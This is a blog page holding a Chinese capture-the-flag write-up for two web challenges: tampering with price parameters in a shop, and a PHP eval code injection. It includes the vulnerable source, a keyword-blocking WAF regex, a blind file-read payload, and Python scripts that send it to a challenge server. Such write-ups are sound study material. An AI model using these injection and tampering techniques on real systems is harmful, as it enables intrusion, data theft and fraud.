@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"-181.github.io","root":"/","scheme":"Mist","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
+  </script>
+
+  <meta name="description" content="绿帽子商场输入题目网址，出现商品及价格，第二行是我们要买的flag，1000元，而最后一行显示：你有500元。所以我们要想办法搞到1000，才能买到flag。 打开代理，点击flag后面的buy按钮，打开Burp Suite 需要加上session，如图：  点击GO之后，显示钱不够。 那么，我们可以买雪碧 将flag改为xuebi，price仍为1000，原有的500-1000&#x3D;-500，如图">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://-181.github.io/2020/11/18/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E9%A2%98%EF%BC%88python%E8%84%9A%E6%9C%AC%EF%BC%89/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="绿帽子商场输入题目网址，出现商品及价格，第二行是我们要买的flag，1000元，而最后一行显示：你有500元。所以我们要想办法搞到1000，才能买到flag。 打开代理，点击flag后面的buy按钮，打开Burp Suite 需要加上session，如图：  点击GO之后，显示钱不够。 那么，我们可以买雪碧 将flag改为xuebi，price仍为1000，原有的500-1000&#x3D;-500，如图">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/chen-lishan/tuc/raw/master/1000..png">
+<meta property="og:image" content="https://gitee.com/chen-lishan/tuc/raw/master/%E9%9B%AA%E7%A2%A71.png">
+<meta property="og:image" content="https://gitee.com/chen-lishan/tuc/raw/master/flag..png">
+<meta property="og:image" content="https://gitee.com/chen-lishan/tuc/raw/master/jisuan..png">
+<meta property="og:image" content="https://gitee.com/chen-lishan/tuc/raw/master/%E6%8A%93%E5%8C%85a.png">
+<meta property="og:image" content="https://gitee.com/chen-lishan/tuc/raw/master/biaodashi..png">
+<meta property="og:image" content="https://gitee.com/chen-lishan/tuc/raw/master/pawangzhi.png">
+<meta property="og:image" content="https://gitee.com/chen-lishan/tuc/raw/master/%E6%9C%80%E7%BB%88%E7%BB%93%E6%9E%9C.png">
+<meta property="article:published_time" content="2020-11-18T02:37:59.149Z">
+<meta property="article:modified_time" content="2020-11-21T07:28:53.477Z">
+<meta property="article:author" content="lisa">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/chen-lishan/tuc/raw/master/1000..png">
+
+
+<link rel="canonical" href="https://-181.github.io/2020/11/18/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E9%A2%98%EF%BC%88python%E8%84%9A%E6%9C%AC%EF%BC%89/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title> | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Hexo</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%BF%E5%B8%BD%E5%AD%90%E5%95%86%E5%9C%BA"><span class="nav-number">1.</span> <span class="nav-text">绿帽子商场</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">简单的计算题</span></a></li></ol></div>
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lisa</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </section>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2020/11/18/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E9%A2%98%EF%BC%88python%E8%84%9A%E6%9C%AC%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lisa">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-11-18 10:37:59" itemprop="dateCreated datePublished" datetime="2020-11-18T10:37:59+08:00">2020-11-18</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2020-11-21 15:28:53" itemprop="dateModified" datetime="2020-11-21T15:28:53+08:00">2020-11-21</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="绿帽子商场"><a href="#绿帽子商场" class="headerlink" title="绿帽子商场"></a>绿帽子商场</h2><p>输入题目网址，出现商品及价格，第二行是我们要买的flag，1000元，而最后一行显示：你有500元。所以我们要想办法搞到1000，才能买到flag。</p>
+<p>打开代理，点击flag后面的buy按钮，打开Burp Suite</p>
+<p>需要加上session，如图：</p>
+<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/1000..png"></p>
+<p>点击GO之后，显示钱不够。</p>
+<p>那么，我们可以买雪碧</p>
+<p>将flag改为xuebi，price仍为1000，原有的500-1000=-500，如图</p>
+<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E9%9B%AA%E7%A2%A71.png"></p>
+<p>再将1000改为-1000，则结果为1500，那么现在就有1500了</p>
+<p>然后，将xuebi改为flag，点击GO</p>
+<p>即可买到flag，提交答案。</p>
+<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/flag..png"></p>
+<h2 id="简单的计算题"><a href="#简单的计算题" class="headerlink" title="简单的计算题"></a>简单的计算题</h2><p>输入网址，出现有两串极长数字的计算题，可以用Python计算，Python可以当作计算器。打开Python，将数字复制过去，enter后出现答案，将答案复制提交，显示：U 4re right，给出源码，点击Source：</p>
+<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/jisuan..png"></p>
+<p>可以复制到Sublime，以便查看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">function calculator()&#123;</span><br><span class="line">    srand(time());</span><br><span class="line">    $param1 &#x3D; rand();</span><br><span class="line">    $param2 &#x3D; rand();</span><br><span class="line">    $flag  &#x3D;rand(0,4);</span><br><span class="line">    switch ($flag) &#123;</span><br><span class="line">        case 0:</span><br><span class="line">            return sprintf(&quot;%s+%s&quot;,$param1,$param2);</span><br><span class="line">        break;</span><br><span class="line">        case 1:</span><br><span class="line">            return sprintf(&quot;%s-%s&quot;,$param1,$param2);</span><br><span class="line">        break;</span><br><span class="line">        case 3:</span><br><span class="line">            return sprintf(&quot;%s*%s&quot;,$param1,$param2);</span><br><span class="line">        break;</span><br><span class="line">        case 4:</span><br><span class="line">            return sprintf(&quot;%s&#x2F;%s&quot;,$param1,$param2);</span><br><span class="line">        break;</span><br><span class="line">    &#125;&#x2F;&#x2F;计算器，加减乘除的运算</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function waf($str)&#123;</span><br><span class="line">    if(preg_match(&quot;&#x2F;put|sys|exec|\&#96;|\^|\%|\~\&#x2F;|passthru|popen|cat|\\|preg|ph|\&lt;\?|\&lt;|ar|un|sc|va&#x2F;is&quot;, $str))&#123;</span><br><span class="line">        die(&quot;no hack&quot;);&#x2F;&#x2F;对这个内容进行过滤</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;以下用正则替换，把传进来的payload进行替换</span><br><span class="line">if(isset($_GET[&#39;a&#39;]))&#123;</span><br><span class="line">    waf($_GET[&#39;a&#39;]);&#x2F;&#x2F;首先进行一层过滤，对a过滤</span><br><span class="line">    $payload &#x3D; preg_replace(&quot;&#x2F;;&#x2F;&quot;, &quot;&quot;, $_GET[&#39;a&#39;]);&#x2F;&#x2F;两个斜杠中间的分号替换为空</span><br><span class="line">    $go &#x3D; sprintf(&quot;\$check&#x3D;(%s&#x3D;&#x3D;%s);&quot;,$_SESSION[&#39;expr&#39;],$payload);&#x2F;&#x2F;把检查结果赋值给check；计算器随机生成一个表达式，返回给SESSION，给第一个%s；payload给第二个%s，payload是我们传进来的答案；“&#x3D;&#x3D;”比较两个值是否相等，check判断结果是否正确</span><br><span class="line">    &#x2F;&#x2F;echo $go;</span><br><span class="line">    eval($go);&#x2F;&#x2F;写出的表达式会进行一次eval。这里有一个很明显的代码注入，如何注入代码，可以在本地phpstudy中测试一下</span><br><span class="line"></span><br><span class="line">    if($check)&#123;</span><br><span class="line">        $_SESSION[&#39;expr&#39;] &#x3D;  calculator();&#x2F;&#x2F;此处调用了计算器,计算器随机生成一个表达式，返回给SESSION</span><br><span class="line">        $answer &#x3D;  &quot;U 4re right&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $answer &#x3D;  &quot;Try again!&quot;;    </span><br><span class="line">    &#125;&#x2F;&#x2F;如果check是正确的，就会显示&quot;U 4re right&quot;，否则&quot;Try again!&quot;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#39;expr&#39;]&#x3D;calculator();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;source&#39;]))&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ --&gt;</span><br><span class="line">    &lt;title&gt;简单的计算题&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Bootstrap --&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;static&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;!-- jQuery (Bootstrap 的所有 JavaScript 插件都依赖 jQuery，所以必须放在前边) --&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;static&#x2F;jquery-3.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;!-- 加载 Bootstrap 的所有 JavaScript 插件。你也可以根据需要只加载单个插件。 --&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;static&#x2F;bootstrap.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;col-md-4&quot;&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;col-md-4&quot; position&#x3D;&quot;absolute&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;page-header&quot;&gt;</span><br><span class="line">            &lt;h1&gt;简单的计算题&lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">            </span><br><span class="line">                &lt;h4&gt;&lt;?php echo $_SESSION[&#39;expr&#39;];?&gt;&lt;&#x2F;h4&gt;</span><br><span class="line">            </span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;form role&#x3D;&quot;form&quot; method&#x3D;&quot;GET&quot; action&#x3D;&quot;&quot;&gt;</span><br><span class="line">              &lt;div class&#x3D;&quot;form-group&quot;&gt;</span><br><span class="line">                &lt;label for&#x3D;&quot;name&quot;&gt;答案&lt;&#x2F;label&gt;</span><br><span class="line">                &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;form-control&quot; id&#x3D;&quot;name&quot; name&#x3D;&quot;a&quot; placeholder&#x3D;&quot;请输入你的答案&quot;&gt;</span><br><span class="line">              &lt;&#x2F;div&gt;</span><br><span class="line">              &lt;button type&#x3D;&quot;submit&quot; class&#x3D;&quot;btn btn-default&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;form&gt;</span><br><span class="line">            &lt;center&gt;&lt;a href&#x3D;&quot;?source&quot;&gt;Source&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;</span><br><span class="line">            &lt;h3&gt;&lt;?php echo $answer ;?&gt;&lt;&#x2F;h3&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;col-md-4&quot;&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>第32行if语句中的a：</p>
+<p>抓包：在答案输入框中随意输入一些字符，如aaaa，打开火狐代理，点击提交，然后打开Burp Suite，可以看到，我们传入的参数a=提交的aaaa</p>
+<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E6%8A%93%E5%8C%85a.png"></p>
+<p>输入网址127.0.0.1，出现计算题，计算后提交答案，然后可以查看页面源代码。</p>
+<p>返回，在网址后加“）”，可以将前面的数字闭合掉</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (file_get_contents(&#39;.&#x2F;flag&#39;)[0]&#x3D;&#x3D;&#39;f&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>file_get_contents：读文件，将flag读取出来</p>
+<p>and需要两边都正确</p>
+<p>需要先写一个脚本，拆出来</p>
+<p>先写个爬虫，把表达式爬下来</p>
+<p>文件名命名为exp.py，后缀是.py，文件保存之后点击工具，选择“编译系统”，点击Python，然后运行，出现表达式：</p>
+<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/biaodashi..png"></p>
+<p>用正则表达式把表达式爬下来：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">r &#x3D; requests.session();</span><br><span class="line"></span><br><span class="line">result &#x3D; r.get(&quot;http:&#x2F;&#x2F;47.98.234.232:28047&quot;)</span><br><span class="line"></span><br><span class="line">expr &#x3D; re.findall(&quot;&lt;h4&gt;(.*?)&lt;&#x2F;h4&gt;&quot;,result.text)</span><br><span class="line"></span><br><span class="line">print(expr)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<p>[‘111968951*261483365’]</p>
+<p>然后用eval把表达式结果算出来：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">r &#x3D; requests.session();</span><br><span class="line"></span><br><span class="line">result &#x3D; r.get(&quot;http:&#x2F;&#x2F;47.98.234.232:28047&quot;)</span><br><span class="line"></span><br><span class="line">expr &#x3D; re.findall(&quot;&lt;h4&gt;(.*?)&lt;&#x2F;h4&gt;&quot;,result.text)</span><br><span class="line"></span><br><span class="line">print(eval(expr[0]))</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<p>1841553614048981688</p>
+<p>得到的结果用参数a传进去：</p>
+<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/pawangzhi.png"></p>
+<p>然后读flag，先读第一位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(file_get_contents(&#39;&#x2F;flag&#39;)[0])import requests</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">r &#x3D; requests.session();</span><br><span class="line"></span><br><span class="line">result &#x3D; r.get(&quot;http:&#x2F;&#x2F;47.98.234.232:28047&quot;)</span><br><span class="line"></span><br><span class="line">expr &#x3D; re.findall(&quot;&lt;h4&gt;(.*?)&lt;&#x2F;h4&gt;&quot;,result.text)</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;47.98.234.232:28027&#x2F;?a&#x3D;%s&quot;%(str(eval(expr[0]))+&quot; and (file_get_contents(&#39;&#x2F;flag&#39;)[0])&#x3D;&#x3D;&#39;f&#39;&quot;) #用%s格式化字符串写</span><br><span class="line"></span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure>
+
+<p>运行之后，得到payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">r &#x3D; requests.session();</span><br><span class="line"></span><br><span class="line">result &#x3D; r.get(&quot;http:&#x2F;&#x2F;47.98.234.232:28047&quot;)</span><br><span class="line"></span><br><span class="line">expr &#x3D; re.findall(&quot;&lt;h4&gt;(.*?)&lt;&#x2F;h4&gt;&quot;,result.text)</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;47.98.234.232:28047&#x2F;?a&#x3D;%s&quot;%(str(eval(expr[0]))+&quot; and (file_get_contents(&#39;&#x2F;flag&#39;)[0])&#x3D;&#x3D;&#39;f&#39;&quot;)</span><br><span class="line">a&#x3D; r.get(url)</span><br><span class="line">if &quot;Try again!&quot; not in a.text:</span><br><span class="line">   print(&quot;yes&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>输出：yes</p>
+<p>接着：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">r &#x3D; requests.session();</span><br><span class="line"></span><br><span class="line">result &#x3D; r.get(&quot;http:&#x2F;&#x2F;47.98.234.232:28047&quot;)</span><br><span class="line"></span><br><span class="line">expr &#x3D; re.findall(&quot;&lt;h4&gt;(.*?)&lt;&#x2F;h4&gt;&quot;,result.text)</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;47.98.234.232:28047&#x2F;?a&#x3D;%s and (file_get_contents(&#39;&#x2F;flag&#39;)[0])&#x3D;&#x3D;&#39;%s&#39;&quot;%(str(eval(expr[0])),&#39;f&#39;)</span><br><span class="line">a&#x3D; r.get(url)</span><br><span class="line">if &quot;Try again!&quot; not in a.text:</span><br><span class="line">   print(&quot;yes&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>完成：</p>
+<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E6%9C%80%E7%BB%88%E7%BB%93%E6%9E%9C.png"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/11/01/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" rel="prev" title="">
+                  <i class="fa fa-chevron-left"></i> 
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lisa</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
